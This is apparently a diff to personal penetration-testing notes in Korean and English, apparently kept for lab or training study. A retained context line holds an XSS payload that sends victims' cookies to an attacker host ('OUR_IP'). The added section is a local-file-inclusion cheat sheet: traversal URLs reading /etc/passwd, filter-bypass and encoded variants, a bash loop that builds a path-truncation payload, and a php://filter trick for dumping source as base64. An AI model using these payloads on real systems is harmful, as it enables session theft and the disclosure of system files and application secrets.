@@ -160,3 +160,27 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨
 
 ---
+
+# LFI
+- find the minimum number of ../ that works and use it.
+- error 내용을 보고 유추할 수 있다.
+- 안될시에 payload를 URL ENCODED를 해서 시도해볼 것.
+- `etc/passwd`
+- `C:\Windows\boot.ini`
+- http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
+- http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
+- http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
+- <SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+- <SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+- ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
+- `..././`,`....\/`,`....////`,`%2e%2e%2f`,`/etc/passwd%00`
+- For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.
+```bash
+echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+
+## PHP Filters
+- http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
+```bash
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+```
